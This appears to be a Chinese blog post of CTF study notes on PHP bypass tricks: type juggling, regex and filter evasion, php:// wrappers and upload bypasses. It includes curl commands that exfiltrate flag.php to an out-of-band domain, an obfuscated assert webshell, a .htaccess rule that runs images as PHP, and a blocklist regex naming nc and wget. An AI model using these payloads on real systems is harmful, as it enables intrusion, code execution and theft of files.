---
title: 
date: 2022-05-29 16:58:50
categories:
- security
tags:
- php
toc: true
---
**摘要：本文总结了ctf中涉及php的tricks**
<!-- more -->
---
# 搭建环境
[kali](http://www.javashuo.com/article/p-cwpcukmt-ek.html)
# 一.伪随机数
mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数。
提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数。并且如果设置了 seed参数 生成的随机数就是伪随机数，即每次生成的随机数是一样的
mt_rand()的值与`调用次数、操作系统、php版本(浏览器插件查看)`有关
若不知道seed，可用[工具](https://www.openwall.com/php_mt_seed/)或自己遍历种子与随机数比较
```bash
在linux下面make之后运行脚本添加随机数 time ./php_mt_seed 183607393 #一定加time否则很慢
或 time ./php_mt_seed 1328851649 1328851649 0 2147483647 1423851145 #第一次范围，第二次缺省，第三次调用输出的随机数为1423851145
```
# 二、函数
## intval
1.如果第二个参数是 0，通过检测 var 的格式来决定使用的进制：
如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，如果字符串以 "0" 开始，使用 8 进制(octal)；否则，使用 10 进制 (decimal)。注意数字前可以加'+'
2.intval() 不能用于 object和数组，否则会产生 E_NOTICE 错误并返回 1（通常配合preg_match来使用）
3.小数舍去
```php
intval('1e1000')=1 //英文字母后的数字都省略
intval(665.999999)==665 //而665.9999999==666成立
intval(array())=0,intval(array(2,3,4))=1,intval(array('aa','bb','cc'))=1 //非空的数组会返回1,注意在url输入[]来表示数组，array会被认作字符串
intval('0x3A')=0,intval(0x3A)=58,intval('0x3A',0)=58 //十六进制,八进制开头是0
```
## preg_match()
返回的匹配次数，不匹配为0，匹配成功1次即为1，然后停止搜索
preg_match_all()不同于此，它会一直搜索直到到达结尾
### 正则表达式
\056\160\150\x70为16进制和8进制ascii代码
"\\|"就是表示"|"
|属于正则中的元字符，表示或的意思，因此表示'|'字符本身必须转义
\本身具有转义作用，\\表示\ ,'\\|'传给正则就是"\|",表示对|进行转义，不作为特殊字符使用
### 绕过方法：
1.数组绕过，如果发生错误(比如传进参数是数组),两者返回 FALSE。常配合file_put_contents的数组漏洞使用
![20220530161635](https://s2.loli.net/2022/05/30/My7EKucwznBFSkW.png)
2.多行匹配/m
看到/i可想到%0a绕过
```php
/^AB/会匹配"ABn e"中的A，但是不会匹配"ab AB"中的A //匹配开始行
[^a-zA-Z0-9]表示“找到一个非字母也非数字的字符”。 //取否

/i //忽略大小写
/g //全文查找出现的所有匹配字符
/m //多行查找,可通过%0a绕过,详细参见https://wenku.baidu.com/view/a897bc29f22d2af90242a8956bec0975f465a4c0.html

^php //开头匹配 如phpaaa
php$ //结尾匹配 如aaaphp
^php$ //只有php能匹配
```
3.长度溢出
```php
echo str_repeat('very', '250000').'36Dctfshow';
```

## ereg()
绕过：ereg()函数存在NULL截断漏洞，当传入的字符串包含%00时，只有%00前的字符串会传入函数并执行，而后半部分不会传入函数判断。因此可以使用%00截断，连接非法字符串，从而绕过函数

## highlight_file
用绝对路径和相对路径../和./绕过，得到文件包含
`$_SERVER`参数会自动加上HTTP_
文件上传时可以用show_source(__FILE__);看上传成功没有

## file_put_contents
看file_put_contens的文档即可发现，函数第二个允许传入数组，将被连接为字符串再写入
![20220530162849](https://s2.loli.net/2022/05/30/Po8u6qYBcOIQasM.png)

## in_array()
```php
bool in_array ( 要在数组搜索的值 , 要搜索的数组, bool $strict = FALSE) //漏洞在于第三个参数可选，如不设置为true就不检测类型，是弱比较，相当于==号，如"1.php"==1
```
## is_numeric
非数值->数值：
1.可以将非数值字符串转换为16进制再进行判断
```php
1 or 1 -> 0x31206f722031
is_numeric("0x123");//php7以后为false,以前为true
```
2.在数字前加上空格，也会被is_numeric函数认为是数字
```php
%0c=>\f
trim函数会过滤空格以及\n\r\t\v\0，但不会过滤\f
is_numeric("%0c36") //true
```
数值->非数值的绕过:
可以借助url编码中的空字符，例如%00或者%20，其中%00加在数值前面或者后面都可以；%20加在数值末尾也可以绕过
## is_file
绕过：利用函数所能处理的长度限制进行目录溢出。从而让is_file认为不是一个文件

## call_user_func(函数，参数)
可调用此文件定义好的函数(默认有hex2bin,bin2hex等字符串和16进制转换可用)

## parse_str
```php
parse_str("name=Peter&age=43",$myArray);//Array ( [name] => Peter [age] => 43 )
```
## eregi、ereg
注意在PHP7已废用
```php
eregi(正则表达式，匹配字符串)//不区分大小写
如ereg ("^[a-zA-Z0-9]+$",$_GET['password'])限制了password的形式，只能是一个或者多个数字、大小写字母，可以使用%00截断正则匹配。password=1e8%00*-*
如eregi("111".substr($b,0,1),"1114")可令$b=.或$b=%00
```

# 三、字符串
## strpos
strpos() 函数是区分大小写的。
返回字符串在另一个字符串中第一次出现的位置。如果没有找到该字符串，则返回 false 
绕过方法：1.利用换行（%0a）或+(%2b,如果是数字)进行绕过
`if(!strpos($num, "0"))`
2.大小写
3.目录穿越
```php
if(stripos($f, 'ctfshow')>0){
        echo readfile($f);
}
/ctfshow/../../../../var/www/html/flag.php 
```
## str_replace
用于替换字符串中指定字符（区分大小写）
```
str_replace(要查找的值,替换的值,被搜索的字符串,可选count)
```
绕过：str_replace无法迭代过滤 ，可以通过双写绕过
## strtr
```php
strtr(string,from,to)
strtr(string,array)
$arr = array("Hello" => "Hi", "world" => "earth");
```
## 表单
PHP接收参数时，发现表单名中如果是 句号(.)或者空格( )，会被转换成下划线(_) 
解决方法：
```php
A[W.C //A_W.C
```

# 四、md5、sha1
## 弱类型比较
```php
md5('QNKCDZO') == 
'0e830400451993494058024219903391'
md5('240610708') == 
'0e462097431906509019562988736854'
```
## ===数组碰撞
md5传入数组会返回NULL
[1] !== [2] && md5([1]) === md5([2])

# 五、运算符优先级
## and
AND运算符和&&运算符的根本区别在于它们的优先级差异，但两者都执行相同的操作。
第一个表达式，`$bool = TRUE && FALSE`; 计算结果为FALSE，因为执行了第一个&&操作，然后将结果赋值给变量`$bool`，因为&&运算符的优先级高于=的优先级。
第二个表达式，`$bool = TRUE and FALSE`; 计算结果为TRUE，因为运算符"and"的优先级低于运算符"="，因此=的右边的值TRUE被分配给`$bool`，然后"and"操作在内部执行但未分配，因此`$bool`现在保持为TRUE。

## && ||
```php
A && B || C //可不管A,B,只保证C为true
```

# 六、内置类
1.反射类
```php
eval("echo new $v1($v2());");
// v1=ReflectionClass&v2=system('cat fl36dg.txt')
//当新建ReflectionClass类并传入PHP代码时，会返回代码的运行结果，可以通过echo显示。即使传入了空的括号，代码依旧可以运行
echo new ReflectionClass('class');//返回类信息
echo new ReflectionObject($student);
echo new ReflectionFunction(getcwd);//Function [ function getcwd ] { - Parameters [0] { } }

```
2.Exception类
3.FilesystemIterator类
```php
$iterator = new FilesystemIterator('.'); // 创建当前目录的迭代器,默认只显示第一个文件,需要遍历
getcwd()//获取当前工作目录
```

# 七、伪协议
```php
include($_GET["file"]);//php://input读取post的data的内容作为文件
php://filter/read=convert.base64-encode/resource=/flag
file_put_contents($v3,$str);//$str进行base64编码
$v3=php://filter/write=convert.base64-decode/resource=1.php
若base64在黑名单，可绕过：
php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
php://filter/read=convert.quoted-printable-encode/resource=flag.php
若php://在黑名单：
compress.zlib://flag.php
```
![20220530222004](https://s2.loli.net/2022/05/30/m8KGvD1UWVBpZe6.png)

# 八、全局变量
flag In the variable 
```php
eval("var_dump($$args);");//?args=GLOBALS
```
_()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll
```php
call_user_func(call_user_func(_,"get_defined_vars"));
_("get_defined_vars")=get_defined_vars
call_user_func(get_defined_vars)
```

# 其他
## 题目给了`eval("$c")`
构造`$c`的方法：
```php
1.echo/var_dump/print $flag/GLOBALS;
2.highlight_file/show_source("flag.php");
```
## $_SERVER
```php
1.$_SERVER['argv']
GET:?a=1+fl0g=flag_give_me
POST:CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])
or
GET:?$fl0g=flag_give_me
POST:CTF_SHOW=&CTF[SHOW.COM=&fun=assert($a[0])

2.$_SERVER['QUERY_STRING'];//url的?后的所有内容
```

## 变量覆盖
```php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("6个字母都还不够呀?!");
    }
}
?F=`$F`;空格sleep 3//好像网站确实sleep了一会说明的确执行了命令
``是shell_exec()函数的缩写
先进行substr()函数截断然后去执行eval()函数,即eval("`$F`;空格")
而$F就是我们输入的`$F`;空格sleep 3
即最终效果是eval(`sleep 3`);//注意sleep 3是shell命令，不会在网站显示，所以需要OOB
```
```php
?F=`$F`;+curl -X POST -F xx=@flag.php  http://生成的域名
//xx是上传文件的name值，可随便写。flag.php就是上传的文件,前面要加@表示是文件 
```
![20220602121923](https://s2.loli.net/2022/06/02/zeHhvOYNqZlS7r9.png)
# 文件上传
一句话木马：
```php
eval("echo%20phpinfo();");//注意eval里一定要有引号和分号结束，以及echo不能再接引号了，否则要转义
$poc="a#s#s#e#r#t"; $poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s'])//过狗一句话
```
## 后缀名绕过
1.%00截断
2.py
```py
import os
os.system('find /* |grep flag')
```
## 路径绕过
```
./ ../ /
在文件名后面加/
```
## .htaccess解析绕过
```
AddType application/x-httpd-php .png
```
## 内容绕过
```php
preg_match('#\w{2,}|[678]|<\?|/#',$content);//不能出现2个及以上字母或数字|<?|/
```
1.用字符串连接符.绕过
2.可变函数绕过(注意eval函数不能用)
```
$a = 'a'.'s'.'s'.'e'.'r'.'t'
$a();
```
3.结尾的结束符?>可忽略，因为php是动态脚本
4.短标签绕过
```php
<?= ?> //所有情况可用
<? ?> //需开启短标签
<script language="PHP"> <script/>
```
5.eval,assert
6.system,wget,nc,exec,passthru,netcat,curl 
```php
curl `cat flag.php|grep "flag"`.当时创建的域名 //dnslog

```

# 命令执行
1.注释，如`$v2=/*,$v3=*/` 
2.命令分隔符;

---

